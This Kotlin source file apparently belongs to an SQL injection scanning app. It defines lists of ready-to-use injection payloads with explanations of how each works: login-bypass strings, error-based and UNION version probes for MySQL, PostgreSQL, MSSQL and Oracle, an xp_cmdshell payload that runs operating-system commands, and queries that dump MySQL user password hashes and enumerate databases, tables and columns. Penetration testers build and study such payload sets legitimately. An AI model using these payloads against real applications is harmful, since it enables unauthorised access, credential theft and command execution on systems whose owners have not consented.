package com.sqliblackboxpro

data class PayloadInfo(
    val payload: String,
    val description: String,
    val category: String,
    val isCustom: Boolean = false
)

object SQLPayloads {
    
    private val customPayloads = mutableListOf<PayloadInfo>()
    private val lock = Any()
    
    // Payload descriptions map
    private val payloadDescriptions = mapOf(
        "' OR '1'='1" to "Boolean-based blind injection. Tests if the application evaluates '1'='1' (always true), bypassing authentication or revealing data by making the WHERE clause always true.",
        "' OR 1=1--" to "Classic authentication bypass. Makes the SQL query always return true by adding '1=1' condition and commenting out the rest with '--'. Often used to bypass login forms.",
        "\" OR \"1\"=\"1" to "Double-quote variant of boolean injection. Similar to single-quote version but uses double quotes. Tests if the application improperly handles double-quoted strings.",
        "\" OR 1=1--" to "Double-quote authentication bypass. Closes the double-quoted string and adds always-true condition, commenting out password check.",
        "' OR 'a'='a" to "Alternative boolean-based injection. Uses letter comparison instead of numbers. Tests if character-based comparisons are vulnerable.",
        "') OR ('1'='1" to "Parentheses-based injection. Closes an existing parenthesis in the query before adding the always-true condition. Common in complex WHERE clauses.",
        "\") OR (\"1\"=\"1" to "Double-quote with parentheses injection. Combines parentheses closure with double-quote injection for more complex query structures.",
        "' OR '1'='1' --" to "Boolean injection with SQL comment (space before --). The space is crucial for some databases like MySQL. Makes the query always true.",
        "' OR '1'='1' #" to "Boolean injection with MySQL hash comment. Uses '#' to comment out rest of query (MySQL-specific). Bypasses authentication checks.",
        "' OR '1'='1'/*" to "Boolean injection with C-style comment. Uses '/*' to comment out the rest. Works across multiple SQL databases.",
        "admin' --" to "Username-based bypass. Assumes 'admin' is a valid username and comments out the password check. Direct admin access attempt.",
        "admin' #" to "Admin bypass with MySQL comment. Closes the username field as 'admin' and uses '#' to ignore password verification.",
        "admin'/*" to "Admin bypass with C-comment. Attempts to login as admin by commenting out password check with C-style comment.",
        "' or 1=1--" to "Lowercase variant of classic injection. Some applications filter uppercase keywords, this tests case-sensitivity of filtering.",
        "' or 1=1#" to "Lowercase with MySQL comment. Tests both case-sensitivity and MySQL-specific commenting.",
        "' or 1=1/*" to "Lowercase with C-comment. Tests if lowercaseing bypasses filters while using universal C-style comment.",
        "') or '1'='1--" to "Closing parenthesis with SQL comment. Handles queries with parentheses and uses standard SQL comment.",
        "') or ('1'='1" to "Double parentheses injection. Closes and opens new parentheses to inject always-true condition in nested queries.",
        
        // MySQL specific
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT VERSION()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--" to "MySQL error-based injection. Forces a duplicate entry error that reveals the MySQL version in the error message. Exploits GROUP BY with RAND() to trigger predictable duplicate key error.",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--" to "MySQL EXTRACTVALUE injection. Uses EXTRACTVALUE XML function with invalid XPath to generate error containing database version. Extracts version info through error messages.",
        "' UNION SELECT NULL,VERSION(),NULL--" to "UNION-based MySQL version extraction. Appends a UNION query to retrieve MySQL version. Requires matching number of columns in original SELECT.",
        "' AND updatexml(null,concat(0x0a,version()),null)-- " to "MySQL UPDATEXML injection. Uses UPDATEXML XML function to force error displaying version. Another error-based technique to extract database information.",
        
        // PostgreSQL specific
        "' AND 1=CAST((SELECT VERSION()) AS INT)--" to "PostgreSQL type-casting injection. Attempts to cast version string to integer, causing error that reveals PostgreSQL version in error message.",
        "' UNION SELECT NULL,VERSION(),NULL--" to "UNION-based PostgreSQL version extraction. Retrieves PostgreSQL version using UNION. Tests if application displays database version.",
        "' AND 1::int=1 AND ''='" to "PostgreSQL cast operator injection. Uses '::' casting operator specific to PostgreSQL. Tests PostgreSQL-specific syntax vulnerabilities.",
        
        // MSSQL specific
        "' AND 1=CONVERT(INT,@@VERSION)--" to "MS SQL Server version extraction. Forces type conversion error to reveal SQL Server version through @@VERSION. Error message contains detailed version info.",
        "' UNION SELECT NULL,@@VERSION,NULL--" to "UNION-based MSSQL version extraction. Directly selects SQL Server version using @@VERSION global variable.",
        "'; EXEC xp_cmdshell('whoami')--" to "MSSQL command execution. Executes operating system command 'whoami' using xp_cmdshell. EXTREMELY DANGEROUS - can achieve remote code execution if enabled.",
        
        // Oracle specific
        "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT BANNER FROM v$version WHERE ROWNUM=1))--" to "Oracle UTL_INADDR injection. Uses Oracle's network utility package to trigger error revealing version banner. Exploits DNS lookup failure to display version.",
        "' UNION SELECT NULL,BANNER,NULL FROM v$version--" to "Oracle version extraction via UNION. Selects version banner from Oracle's system view v$version.",
        
        // Data extraction
        "' UNION SELECT NULL,CONCAT(user,':',password),NULL FROM mysql.user--" to "MySQL user credentials dump. Extracts all MySQL user accounts and their password hashes from mysql.user table. Critical security breach if successful.",
        "' UNION SELECT NULL,CONCAT(schema_name),NULL FROM information_schema.schemata--" to "Database names enumeration. Lists all database schemas available on the MySQL server from information_schema.",
        "' UNION SELECT NULL,CONCAT(table_name),NULL FROM information_schema.tables--" to "Table names enumeration. Lists all tables across all databases from information_schema. Reveals database structure.",
        "' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='users'--" to "Column names extraction for 'users' table. Reveals all column names in the users table, helping attacker understand data structure for targeted extraction."
    )
    
    // Basic SQL injection payloads for detection
    val DETECTION_PAYLOADS: List<String>
        get() = synchronized(lock) {
            baseDetectionPayloads + customPayloads.map { it.payload }
        }
    
    private val baseDetectionPayloads = listOf(
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR \"1\"=\"1",
        "\" OR 1=1--",
        "' OR 'a'='a",
        "') OR ('1'='1",
        "\") OR (\"1\"=\"1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR '1'='1'/*",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1"
    )
    
    // Database-specific error-based payloads
    val MYSQL_PAYLOADS = listOf(
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT VERSION()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "' UNION SELECT NULL,VERSION(),NULL--",
        "' AND updatexml(null,concat(0x0a,version()),null)-- "
    )
    
    val POSTGRESQL_PAYLOADS = listOf(
        "' AND 1=CAST((SELECT VERSION()) AS INT)--",
        "' UNION SELECT NULL,VERSION(),NULL--",
        "' AND 1::int=1 AND ''='"
    )
    
    val MSSQL_PAYLOADS = listOf(
        "' AND 1=CONVERT(INT,@@VERSION)--",
        "' UNION SELECT NULL,@@VERSION,NULL--",
        "'; EXEC xp_cmdshell('whoami')--"
    )
    
    val ORACLE_PAYLOADS = listOf(
        "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT BANNER FROM v$version WHERE ROWNUM=1))--",
        "' UNION SELECT NULL,BANNER,NULL FROM v$version--"
    )
    
    // Data extraction payloads (for MySQL)
    val DATA_EXTRACTION_PAYLOADS = listOf(
        "' UNION SELECT NULL,CONCAT(user,':',password),NULL FROM mysql.user--",
        "' UNION SELECT NULL,CONCAT(schema_name),NULL FROM information_schema.schemata--",
        "' UNION SELECT NULL,CONCAT(table_name),NULL FROM information_schema.tables--",
        "' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='users'--"
    )
    
    // Get all payloads for comprehensive scanning
    fun getAllPayloads(): List<String> {
        return DETECTION_PAYLOADS + MYSQL_PAYLOADS + POSTGRESQL_PAYLOADS + 
               MSSQL_PAYLOADS + ORACLE_PAYLOADS
    }
    
    // Get all payloads with their info
    fun getAllPayloadInfo(): List<PayloadInfo> = synchronized(lock) {
        val allPayloads = mutableListOf<PayloadInfo>()
        
        baseDetectionPayloads.forEach { payload ->
            allPayloads.add(PayloadInfo(
                payload = payload,
                description = payloadDescriptions[payload] ?: "SQL injection payload for vulnerability detection.",
                category = "Detection Payloads"
            ))
        }
        
        MYSQL_PAYLOADS.forEach { payload ->
            allPayloads.add(PayloadInfo(
                payload = payload,
                description = payloadDescriptions[payload] ?: "MySQL-specific injection payload.",
                category = "MySQL Payloads"
            ))
        }
        
        POSTGRESQL_PAYLOADS.forEach { payload ->
            allPayloads.add(PayloadInfo(
                payload = payload,
                description = payloadDescriptions[payload] ?: "PostgreSQL-specific injection payload.",
                category = "PostgreSQL Payloads"
            ))
        }
        
        MSSQL_PAYLOADS.forEach { payload ->
            allPayloads.add(PayloadInfo(
                payload = payload,
                description = payloadDescriptions[payload] ?: "MS SQL Server-specific injection payload.",
                category = "MSSQL Payloads"
            ))
        }
        
        ORACLE_PAYLOADS.forEach { payload ->
            allPayloads.add(PayloadInfo(
                payload = payload,
                description = payloadDescriptions[payload] ?: "Oracle-specific injection payload.",
                category = "Oracle Payloads"
            ))
        }
        
        DATA_EXTRACTION_PAYLOADS.forEach { payload ->
            allPayloads.add(PayloadInfo(
                payload = payload,
                description = payloadDescriptions[payload] ?: "Payload for extracting data from database.",
                category = "Data Extraction Payloads"
            ))
        }
        
        allPayloads.addAll(customPayloads)
        
        return allPayloads
    }
    
    fun getPayloadDescription(payload: String): String = synchronized(lock) {
        return customPayloads.find { it.payload == payload }?.description
            ?: payloadDescriptions[payload]
            ?: "SQL injection payload for testing application security vulnerabilities."
    }
    
    fun addCustomPayload(payload: String, description: String, category: String = "Custom Payloads") = synchronized(lock) {
        customPayloads.add(PayloadInfo(payload, description, category, isCustom = true))
    }
    
    fun removeCustomPayload(payload: String) = synchronized(lock) {
        customPayloads.removeAll { it.payload == payload }
    }
    
    fun getCustomPayloads(): List<PayloadInfo> = synchronized(lock) {
        return customPayloads.toList()
    }
}

